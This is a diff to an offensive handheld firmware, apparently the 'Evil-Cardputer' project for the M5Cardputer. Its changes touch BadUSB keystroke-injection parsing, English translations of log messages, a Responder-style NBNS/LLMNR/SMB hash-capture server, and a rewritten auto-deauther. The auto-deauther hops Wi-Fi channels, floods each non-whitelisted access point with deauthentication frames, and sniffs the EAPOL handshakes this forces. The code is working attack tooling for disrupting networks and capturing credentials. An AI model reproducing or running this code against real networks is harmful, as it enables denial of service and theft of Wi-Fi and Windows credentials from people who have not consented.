-          if (strcmp(Cmd, "CTRL-SHIFT-GUI") == 0) { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) { Kb.press(KEY_LEFT_GUI);                                     if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) { Kb.press(KEY_LEFT_CTRL);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "SHIFT") == 0)        { Kb.press(KEY_LEFT_SHIFT);                                                         if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}  // Save Cmd into OldCmd and then set Cmd = Argument
+          if (strcmp(Cmd, "ALT") == 0)          { Kb.press(KEY_LEFT_ALT);                                                           if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}  // This is made to turn the code faster and to recover
+          if (strcmp(Cmd, "CTRL-ALT") == 0)     { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}  // the Cmd after the if else statements, in order to
+          if (strcmp(Cmd, "CTRL-SHIFT") == 0)   { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);                                if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}// the Cmd REPEAT work as intended.
+          if (strcmp(Cmd, "CTRL-GUI") == 0)     { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "ALT-SHIFT") == 0)    { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "ALT-GUI") == 0)      { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_GUI);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "GUI-SHIFT") == 0)    { Kb.press(KEY_LEFT_GUI); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "CTRL-ALT-SHIFT") == 0) { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "CTRL-ALT-GUI") == 0)   { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "ALT-SHIFT-GUI") == 0)  { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);       if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "CTRL-SHIFT-GUI") == 0) { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) { Kb.press(KEY_LEFT_GUI);                                     if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
+          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) { Kb.press(KEY_LEFT_CTRL);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strncpy(OldCmd, Cmd, sizeof(OldCmd) - 1); OldCmd[sizeof(OldCmd) - 1] = '\0'; strncpy(Cmd, Argument.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; goto restart; }} else { cmdFail++;}
           if (strcmp(Cmd, "ESC") == 0 || strcmp(Cmd, "ESCAPE") == 0) {Kb.press(KEY_ESC);Kb.releaseAll(); } else { cmdFail++;}
           if (strcmp(Cmd, "ENTER") == 0)        { Kb.press(KEY_RETURN); Kb.releaseAll(); }    else { cmdFail++; }
           if (strcmp(Cmd, "DOWNARROW") == 0)    { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
@@ -16115,7 +16450,7 @@ void key_input(FS &fs, const String &bad_script) {
           if (strcmp(Cmd, "DELETE") == 0)       { Kb.press(KEY_DELETE);     Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "SPACE") ==0)         { Kb.press(KEY_SPACE);      Kb.releaseAll();} else { cmdFail++;}
 
-          if (ArgIsCmd) strcpy(Cmd, OldCmd);  // Recover the command to run in case of REPEAT
+          if (ArgIsCmd) { strncpy(Cmd, OldCmd, sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0'; }  // Recover the command to run in case of REPEAT
 
           Kb.releaseAll();
 
@@ -16207,8 +16542,8 @@ void showScriptOptions() {
 
     if (scriptOptions.empty()) {
         // Affichez un message à l'utilisateur ou exécutez une action par défaut
-        Serial.println(F("Aucun script disponible."));
-        M5.Display.println("Aucun script disponible.");
+        Serial.println(F("No script available."));
+        M5.Display.println("No script available.");
         // Vous pouvez aussi exécuter une fonction par défaut ici, si nécessaire
     } else {
         loopOptions(scriptOptions, false, true, "Choose Script");
@@ -16245,7 +16580,7 @@ void badUSB() {
 
     loopOptions(mainOptions, false, true, "Main Menu");
 
-    // Attendre que l'utilisateur appuie sur "Entrée" ou "Retour arrière"
+    // Attendre que l'utilisateur appuie sur "Enter" ou "Backspace"
     while (!kp(KEY_ENTER) && !kp(KEY_BACKSPACE)) {
         // Boucle jusqu'à ce qu'une touche soit pressée
     }
@@ -16520,7 +16855,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.5.8,model=Cardputer,release=v1.5.8,"
+  "WigleWifi-1.4,appRelease=v1.5.9,model=Evil-Cardputer,release=v1.5.9,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -17228,7 +17563,7 @@ void wifiVisualizer() {
             int channels[maxChannels + 1] = {0};
 
             if (n == 0) {
-                Serial.println(F("Aucun réseau WiFi trouvé."));
+                Serial.println(F("No WiFi network found."));
             } else {
                 for (int i = 0; i < n; i++) {
                     int channel = WiFi.channel(i);
@@ -18394,7 +18729,7 @@ void ListNetworkAnalysis() {
 bool isBackspacePressed() {
   M5Cardputer.update();
   if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-    Serial.println(F("Touche BACKSPACE détectée, retour au menu."));
+    Serial.println(F("BACKSPACE key detected, back to menu."));
     return true;
   }
   return false;
@@ -20673,9 +21008,9 @@ void logHoneypotCommand(String clientIP, String command) {
         int httpResponseCode = http.POST(jsonPayload);
 
         if (httpResponseCode > 0) {
-            Serial.println(F("Webhook Discord envoyé !"));
+            Serial.println(F("Discord webhook sent !"));
         } else {
-            Serial.println("Erreur envoi webhook Discord : " + String(httpResponseCode));
+            Serial.println("Discord webhook send error: " + String(httpResponseCode));
         }
         http.end();
     }
@@ -21564,7 +21899,7 @@ void captureAssociatedBeacon(uint8_t *bssidTarget) {
         String security = security_int_to_string(WiFi.encryptionType(i));
         int32_t chFound = WiFi.channel(i);
 
-        Serial.println(F("Beacon associé trouvé !"));
+        Serial.println(F("Associated beacon found !"));
         displayAPInfo(ssid, bssidStr, security, rssi, chFound);
         return;
       }
@@ -21572,7 +21907,7 @@ void captureAssociatedBeacon(uint8_t *bssidTarget) {
   }
 
   esp_wifi_set_channel(originalChannelAuto, WIFI_SECOND_CHAN_NONE); // retour au canal initial
-  Serial.println(F("Beacon associée introuvable."));
+  Serial.println(F("Associated beacon not found."));
 }
 
 void displayAPInfo(String ssid, String bssid, String security, int32_t rssi, int32_t channel) {
@@ -21644,7 +21979,7 @@ void eapolSnifferAutoCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   // === Beacon ===
   else if (eapolDetected && isBeacon(pkt)) {
     if (memcmp(lastEAPOLBSSID, bssid, 6) == 0) {
-      Serial.println(F("Beacon associée détectée !"));
+      Serial.println(F("Associated beacon detected !"));
       pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
       enregistrerDansFichierPCAP(pkt, false); 
       eapolDetected = false; // évite de prendre plusieurs fois
@@ -21656,130 +21991,144 @@ void eapolSnifferAutoCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 void autoDeauther() {
   unsigned long lastTime = 0;
-  unsigned long timerDelay = 200;
+  const unsigned long timerDelay = 200;
   unsigned long clearMacHistoryTime = 0;
   const unsigned long macHistoryInterval = 15000;
   int channel = 1;
   const int maxChannel = 13;
+  char bufBSSID[64], Buf[50];
 
-  char bufBSSID[64];
-  char Buf[50];
-
-  M5Cardputer.Display.fillScreen(TFT_BLACK);
-  M5Cardputer.Display.setCursor(0, 0);
-  M5Cardputer.Display.setTextSize(1.5);
-
-  // Load whitelist from config so KarmaAutoWhitelist applies to AutoDeauther
-  // Uses the same config key: KarmaAutoWhitelist=SSID1,SSID2,pa*tern
+  // Whitelist Karma (meme cle config KarmaAutoWhitelist=SSID1,SSID2,pa*tern)
   readConfigFile("/evil/config/config.txt");
   seenWhitelistedSSIDs.clear();
 
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(eapolSnifferAutoCallback);
-  
-  while (true) {
-    M5.update();
-    cardUpdate();
 
-    if (kp(KEY_BACKSPACE)) {
-      break;
-    }
+  // ---- dashboard M5GFX single-sprite (zero flicker), logique de deauth inchangee ----
+  auto& D = M5.Display;
+  const int W = D.width(), H = D.height();
+  M5Canvas cv(&D); cv.setColorDepth(8); bool spr = cv.createSprite(W, H);
+  const uint16_t BG = menuBackgroundColor, NAVY = menuSelectedBackgroundColor,
+                 GRN = menuTextFocusedColor, WHT = menuTextUnFocusedColor,
+                 RED = TFT_RED, ORG = TFT_ORANGE, CYN = TFT_CYAN, GRY = TFT_DARKGREY, YEL = TFT_YELLOW;
+  const uint16_t CARD = 0x1906, DIM = 0x4208;
+  auto rssiCol = [&](int r) -> uint16_t { return r >= -60 ? GRN : (r >= -72 ? YEL : (r >= -82 ? ORG : RED)); };
 
-    if ((millis() - clearMacHistoryTime) > macHistoryInterval) {
-      clear_mac_history();
-      clearMacHistoryTime = millis();
+  uint32_t apsHit = 0, pktsSent = 0, wlSkipped = 0, cycles = 0; int lastFound = 0; bool scanning = false;
+  char ltSsid[28] = "", ltBssid[18] = "", ltSec[12] = ""; int ltRssi = 0, ltCh = 0; bool haveLt = false;
+  struct AdRec { char ssid[22]; char bssid[18]; int8_t rssi; uint8_t ch; }; AdRec recent[5]; int recentN = 0;
+  auto pushRecent = [&](const char* s, const char* b, int r, int c) {
+    for (int i = (recentN < 5 ? recentN : 4); i > 0; i--) recent[i] = recent[i - 1];
+    strncpy(recent[0].ssid, s, sizeof recent[0].ssid - 1); recent[0].ssid[sizeof recent[0].ssid - 1] = 0;
+    strncpy(recent[0].bssid, b, sizeof recent[0].bssid - 1); recent[0].bssid[sizeof recent[0].bssid - 1] = 0;
+    recent[0].rssi = (int8_t)r; recent[0].ch = (uint8_t)c; if (recentN < 5) recentN++;
+  };
+
+  auto render = [&]() {
+    lgfx::LovyanGFX* g = spr ? (lgfx::LovyanGFX*)&cv : (lgfx::LovyanGFX*)&D;
+    g->fillScreen(BG);
+    g->fillRect(0, 0, W, 14, NAVY);
+    g->setTextSize(1); g->setTextColor(RED); g->setCursor(4, 4); g->print("AUTO DEAUTH");
+    { char cm[18]; snprintf(cm, sizeof cm, "CH%d %s", channel, scanning ? "SCAN" : "HIT");
+      int pw = (int)strlen(cm) * 6 + 8; uint16_t pc = scanning ? CYN : ORG;
+      g->fillRoundRect(W - pw - 2, 2, pw, 11, 3, pc); g->setTextColor(TFT_BLACK, pc); g->setCursor(W - pw + 2, 4); g->print(cm); }
+    int cw = (W - 8) / 13;                                   // barre canaux 1-13
+    for (int c = 1; c <= 13; c++) g->fillRect(4 + (c - 1) * cw, 16, cw - 1, 4, (c == channel) ? (scanning ? CYN : ORG) : DIM);
+    g->fillRoundRect(3, 23, 52, 30, 4, CARD);               // carte compteur principal
+    g->setTextSize(2); g->setTextColor(RED); g->setCursor(8, 27); g->printf("%lu", (unsigned long)apsHit);
+    g->setTextSize(1); g->setTextColor(GRY); g->setCursor(8, 45); g->print("APs hit");
+    g->setTextColor(CYN); g->setCursor(60, 25); g->printf("pkts %lu", (unsigned long)pktsSent);
+    g->setTextColor(GRN); g->setCursor(60, 36); g->printf("EAPOL %d", nombreDeEAPOLAuto);
+    g->setTextColor(wlSkipped ? YEL : GRY); g->setCursor(60, 47); g->printf("WLskip %lu", (unsigned long)wlSkipped);
+    g->setTextColor(GRY); g->setCursor(150, 25); g->printf("cyc %lu", (unsigned long)cycles);
+    g->setTextColor(GRY); g->setCursor(150, 36); g->printf("seen %d", lastFound);
+    g->drawFastHLine(0, 56, W, NAVY);
+    if (haveLt) {                                            // derniere cible
+      g->setTextColor(rssiCol(ltRssi)); g->setCursor(4, 60); g->printf("%.22s", ltSsid[0] ? ltSsid : "(hidden)");
+      g->setTextColor(WHT); g->setCursor(4, 72); g->printf("%s c%d %ddBm %s", ltBssid, ltCh, ltRssi, ltSec);
+    } else { g->setTextColor(GRY); g->setCursor(4, 64); g->print("scanning for targets..."); }
+    g->setTextColor(ORG); g->setCursor(4, 86); g->print("recent:");
+    int yy = 97;
+    for (int i = 0; i < recentN && yy < H - 12; i++) {
+      g->setTextColor(rssiCol(recent[i].rssi)); g->setCursor(4, yy);
+      g->printf("%-16.16s c%d %ddBm", recent[i].ssid[0] ? recent[i].ssid : "(hidden)", recent[i].ch, recent[i].rssi); yy += 10;
     }
+    g->fillRect(0, H - 11, W, 11, NAVY); g->setTextColor(GRY); g->setCursor(3, H - 9); g->print("DEL=stop  auto hop 1-13  deauth x5/AP");
+    if (spr) cv.pushSprite(0, 0);
+  };
+
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  enterDebounce();
+  bool stop = false;
+  while (!stop) {
+    M5.update(); cardUpdate();
+    if (kp(KEY_BACKSPACE) || kp('`')) break;
+
+    if ((millis() - clearMacHistoryTime) > macHistoryInterval) { clear_mac_history(); clearMacHistoryTime = millis(); }
 
     if ((millis() - lastTime) > timerDelay) {
+      scanning = true; render();                             // feedback "SCAN chN" pendant le scan bloquant
       esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-      int n = WiFi.scanNetworks(false, true, false, 1000, channel);
+      // 300ms/canal (au lieu de 1000) : assez pour capter les APs (probe-resp + ~3 beacons a 102ms)
+      // tout en traversant vite les canaux vides -> cycle ~4x plus court.
+      int n = WiFi.scanNetworks(false, true, false, 300, channel);
+      scanning = false; lastFound = (n > 0) ? n : 0;
 
-      if (n == 0) {
-        Serial.println(F("No networks found"));
-      } else {
+      if (n > 0) {
+        uint32_t hitsBefore = apsHit;                        // pour n'ecouter les EAPOL que si on a vraiment deauth
         for (int i = 0; i < n; i++) {
           uint8_t* bssidPtr = WiFi.BSSID(i);
-          if (bssidPtr == NULL) {
-            Serial.println(F("Invalid BSSID pointer, skipping..."));
-            continue;
-          }
-        
-          if (seen_mac(bssidPtr)) {
-            Serial.println("Already sent to: " + WiFi.BSSIDstr(i));
-            continue;
-          }
-        
-          // Sauvegarde sécurisée des données
+          if (bssidPtr == NULL) continue;
+          if (seen_mac(bssidPtr)) continue;                  // deja deauth ce cycle (dedup MAC history 15s)
+
           String MacString = WiFi.BSSIDstr(i);
-          strncpy(bufBSSID, MacString.c_str(), sizeof(bufBSSID) - 1);
-          bufBSSID[sizeof(bufBSSID) - 1] = '\0';
-          strcpy(myData.bssid, bufBSSID);
-        
+          strncpy(bufBSSID, MacString.c_str(), sizeof(bufBSSID) - 1); bufBSSID[sizeof(bufBSSID) - 1] = '\0'; strcpy(myData.bssid, bufBSSID);
           String AP = WiFi.SSID(i);
-          strncpy(Buf, AP.c_str(), sizeof(Buf) - 1);
-          Buf[sizeof(Buf) - 1] = '\0';
-          strcpy(myData.ssid, Buf);
+          strncpy(Buf, AP.c_str(), sizeof(Buf) - 1); Buf[sizeof(Buf) - 1] = '\0'; strcpy(myData.ssid, Buf);
 
-          // Skip deauth if SSID matches KarmaAutoWhitelist
-          if (isSSIDWhitelisted(AP.c_str())) {
-            if (seenWhitelistedSSIDs.find(AP.c_str()) == seenWhitelistedSSIDs.end()) {
-              seenWhitelistedSSIDs.insert(AP.c_str());
-              Serial.println("SSID in whitelist, ignoring: " + AP);
-            }
+          if (isSSIDWhitelisted(AP.c_str())) {               // whitelist Karma -> on saute
+            if (seenWhitelistedSSIDs.find(AP.c_str()) == seenWhitelistedSSIDs.end()) { seenWhitelistedSSIDs.insert(AP.c_str()); wlSkipped++; }
             continue;
           }
-        
-          String securityType = security_int_to_string(WiFi.encryptionType(i));
-          int32_t rssi = WiFi.RSSI(i);
-          int32_t apChannel = WiFi.channel(i);
-        
-          // Affichage série
-          Serial.println(F("=== Access Point Information ==="));
-          Serial.printf("SSID: %s\n", AP.c_str());
-          Serial.printf("BSSID: %s\n", MacString.c_str());
-          Serial.printf("Security: %s\n", securityType.c_str());
-          Serial.printf("RSSI: %d dBm\n", rssi);
-          Serial.printf("Channel: %d\n", apChannel);
-          Serial.println(F("==============================="));
 
-          displayAPInfo(AP, MacString, securityType, rssi, apChannel);
-  
-          // Actions
+          String securityType = security_int_to_string(WiFi.encryptionType(i));
+          int32_t rssi = WiFi.RSSI(i); int32_t apChannel = WiFi.channel(i);
+          Serial.printf("[AutoDeauth] %s %s %s %ddBm ch%d\n", AP.c_str(), MacString.c_str(), securityType.c_str(), (int)rssi, (int)apChannel);
+
           save_mac(bssidPtr);
-          for (int i = 0; i < 5; i++) {
-            sendDeauthPacketAuto(bssidPtr, apChannel);          
+          for (int k = 0; k < 5; k++) { sendDeauthPacketAuto(bssidPtr, apChannel); pktsSent++; }
+          apsHit++;
+          strncpy(ltSsid, AP.c_str(), sizeof ltSsid - 1); ltSsid[sizeof ltSsid - 1] = 0;
+          strncpy(ltBssid, MacString.c_str(), sizeof ltBssid - 1); ltBssid[sizeof ltBssid - 1] = 0;
+          strncpy(ltSec, securityType.c_str(), sizeof ltSec - 1); ltSec[sizeof ltSec - 1] = 0;
+          ltRssi = rssi; ltCh = apChannel; haveLt = true;
+          pushRecent(ltSsid, ltBssid, rssi, apChannel);
+          render();
+          delay(40);
+        }
+        if (apsHit > hitsBefore) {                          // on n'a deauth que si de nouveaux APs -> ecoute EAPOL 2s
+          unsigned long listenStart = millis();             // fenetre d'ecoute EAPOL (handshakes provoques)
+          while (millis() - listenStart < 2000) {
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE) || kp('`')) { stop = true; break; }
+            render(); delay(30);
           }
-         delay(50);
         }
-        unsigned long listenStart = millis();
-        while (millis() - listenStart < 2000) {
-          delay(1);
-        }
+        if (stop) break;
       }
 
+      channel++; if (channel > maxChannel) { channel = 1; cycles++; }
       lastTime = millis();
-
-      // Changement de canal
-      channel++;
-      if (channel > maxChannel) channel = 1;
-
-      M5.Lcd.clear();
-      M5.Lcd.setCursor(10, 10);
-      M5.Lcd.printf("Current Channel: %d", channel);
-      M5.Lcd.println(" ");
-      M5.Lcd.println(" ");
-      M5.Lcd.println(" ");
-      M5.Lcd.println(" ");
-      M5.Lcd.println(" ");
-      M5.Lcd.println(" ");
-      M5.Lcd.printf("EAPOL: %d", nombreDeEAPOLAuto);
     }
-    delay(10);  // petite pause CPU
+    render();
+    delay(10);
   }
+
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
-
-  waitAndReturnToMenu("Stopping AutoDeauth");  // retour au menu principal
+  if (spr) cv.deleteSprite();
+  waitAndReturnToMenu("Stopping AutoDeauth");
 }
 
 
@@ -22942,7 +23291,7 @@ void sendSMB1NegotiateResponse(uint8_t* req) {
   resp[3] = (total - 4);
 
   smbState.client.write(resp, total);
-  Serial.println(F("→ Negotiate Response SMB1 envoyé (ExtSec OK)"));
+  Serial.println(F("-> Negotiate Response SMB1 sent (ExtSec OK)"));
 }
 
 void sendSMB1Type2(uint8_t* req, uint8_t* ntlm1) {
@@ -23326,11 +23675,11 @@ void responder() {
   hashCount = 0;
   // Démarrer l'écoute NBNS (UDP 137)
   if (!nbnsUDP.begin(NBNS_PORT)) {
-    Serial.println(F("Erreur: Impossible to listen on UDP 137"));
+    Serial.println(F("Error: cannot listen on UDP 137"));
   }
   // Démarrer l'écoute LLMNR (UDP 5355) en IPv4 uniquement
   if (!llmnrUDP.beginMulticast(IPAddress(224, 0, 0, 252), LLMNR_PORT)) {
-    Serial.println(F("Erreur: échec abonnement multicast LLMNR"));
+    Serial.println(F("Error: LLMNR multicast subscription failed"));
   }
   // Démarrer le serveur SMB (TCP 445)
   smbServer.begin();
@@ -23509,7 +23858,7 @@ void responder() {
       smbState.client = newClient;
       smbState.active = true;
       smbState.sessionId = 0;
-      Serial.println(F("Connexion SMB received, starting the SMB2 negociation..."));
+      Serial.println(F("SMB connection received, starting the SMB2 negotiation..."));
     }
   }
 
@@ -23528,7 +23877,7 @@ void responder() {
           // Lire le paquet SMB complet
           uint8_t *packet = (uint8_t*)malloc(smbLength);
           if (!packet) {
-            Serial.println(F("Mémoire insuffisante pour SMB"));
+            Serial.println(F("Not enough memory for SMB"));
             smbState.client.stop();
             smbState.active = false;
           } else {
@@ -23538,7 +23887,7 @@ void responder() {
                 uint16_t command = packet[12] | (packet[13] << 8);
                 // Négociation SMB2
                 if (command == 0x0000) { // SMB2 NEGOTIATE
-                  Serial.println(F("Requête SMB2 Negotiate receivede."));
+                  Serial.println(F("SMB2 Negotiate request received."));
                   // Construire et envoyer la réponse SMB2 Negotiate (sélection SMB2.1)
                   // Copier l'en-tête du client pour le renvoyer modifié
                   uint8_t resp[128];
@@ -23770,7 +24119,7 @@ void previewTextFile(const char *path) {
   // Ouvre le fichier en lecture
   File f = SD.open(path);
   if (!f) {
-    Serial.printf("Erreur : impossible d'ouvrir %s\n", path);
+    Serial.printf("Error: cannot open %s\n", path);
     return;
   }
 
@@ -23814,7 +24163,7 @@ void previewTextFile(const char *path) {
       // Afficher l’en‐tête avec le nom du fichier (en jaune)
       M5.Display.setCursor(5, areaY);
       M5.Display.setTextColor(TFT_YELLOW);
-      M5.Display.print("Fichier: ");
+      M5.Display.print("File: ");
       M5.Display.println(filename);
       M5.Display.drawLine(areaX, areaY + 12, areaW, areaY + 12, TFT_DARKGREY);
 
@@ -24035,22 +24384,22 @@ void fileManager() {
             // Si l'utilisateur confirme
             if (SD.exists(fullPath.c_str())) {
               if (SD.remove(fullPath.c_str())) {
-                Serial.printf("Fichier supprimé : %s\n", fullPath.c_str());
+                Serial.printf("File deleted: %s\n", fullPath.c_str());
                 // Ajuster le curseur (un élément de moins dans la liste)
                 fmFileCursor = constrain(fmFileCursor, 0, total - 2);
               }
               else {
-                Serial.printf("Erreur : impossible de supprimer %s\n", fullPath.c_str());
+                Serial.printf("Error: cannot delete %s\n", fullPath.c_str());
               }
             }
             else {
-              Serial.printf("Erreur : le fichier %s n'existe plus\n", fullPath.c_str());
+              Serial.printf("Error: file %s no longer exists\n", fullPath.c_str());
             }
           }
           // si l'utilisateur annule, on ne fait rien
         }
         else {
-          Serial.println(F("Impossible de supprimer : ce n'est pas un fichier valide."));
+          Serial.println(F("Cannot delete: not a valid file."));
         }
         // Rekick pour reconstruire la liste (fichier potentiellement supprimé)
         break;
@@ -24072,17 +24421,17 @@ void scanFileManager(const char *path) {
   // On ouvre le fichier dans currentFile
   currentFile = SD.open(path);
   if (! currentFile) {
-    Serial.printf("Erreur : impossible d'ouvrir %s\n", path);
+    Serial.printf("Error: cannot open %s\n", path);
     return;
   }
 
   // Exemple de traitement : afficher le début du fichier sur le port série
-  Serial.printf("Ouverture de %s :\n", path);
+  Serial.printf("Opening %s:\n", path);
   while (currentFile.available()) {
     char c = currentFile.read();
     Serial.write(c);
   }
-  Serial.println(F("\n--- fin du fichier ---"));
+  Serial.println(F("\n--- end of file ---"));
 
   currentFile.close();
 }
@@ -24135,6 +24484,19 @@ int                screenRows  = 0;
 static bool     screenDirty   = false;
 static uint32_t nextFlushMs   = 0;
 
+// ===== Refonte UART Terminal (pins selectionnables + UI sprite) =====
+static int      ut_rxPin   = 1, ut_txPin = 2;   // GPIO RX/TX choisis par l'user (-1 TX = RX only)
+// Couleur de ligne encodee dans l'octet de tete de chaque String de logBuf (1=RX 2=TX 3=SYS)
+// -> aucun conteneur global supplementaire : ZERO RAM au boot (logBuf existe deja).
+static uint32_t ut_rxBytes = 0, ut_txBytes = 0; // compteurs
+static uint8_t  ut_eol     = 2;                 // fin de ligne TX : 0=none 1=CR 2=LF 3=CRLF
+static bool     ut_hex     = false;             // affichage hex des octets RX
+static bool     ut_pause   = false;             // gel de l'affichage (RX continue en buffer)
+static const char* UT_EOL_NAME[4] = {"NONE","CR","LF","CRLF"};
+static const char* UT_EOL_SEQ [4] = {"", "\r", "\n", "\r\n"};
+static M5Canvas* ut_cv    = nullptr;            // double-buffer (alloc a l'entree, zero RAM boot)
+static String    ut_input = "";                 // ligne de saisie en cours
+
 #ifdef AUTOSHELL_BURST_FREEZE
